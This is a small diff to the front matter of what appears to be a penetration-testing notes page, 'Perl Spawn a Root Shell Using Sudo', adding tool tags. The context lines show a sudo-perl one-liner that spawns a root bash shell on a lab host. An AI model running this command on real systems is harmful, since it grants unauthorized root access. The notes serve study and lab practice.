@@ -9,6 +9,9 @@ output: 'bob@host:/$ sudo /usr/bin/perl -e ''system("/bin/bash")''
   root@Shocker:/#'
 created_at: '2019-11-23T01:30:50.359949+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[host]]'
+- '[[sudo]]'
 ---
 
 # Perl Spawn a Root Shell Using Sudo
